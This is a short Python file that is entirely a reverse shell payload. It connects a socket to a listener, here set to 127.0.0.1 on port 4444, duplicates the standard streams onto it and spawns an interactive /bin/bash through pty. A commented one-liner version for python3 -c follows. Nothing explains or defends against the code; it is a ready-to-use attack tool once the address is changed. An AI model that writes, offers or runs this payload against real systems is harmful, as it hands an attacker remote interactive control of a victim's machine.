import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
IP="127.0.0.1";PORT=4444;
s.connect((IP,PORT));os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
import pty; pty.spawn("/bin/bash")
''' One liner python reverse shell
python3 -c 'IP="127.0.0.1";PORT=4444;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((IP,PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
'''
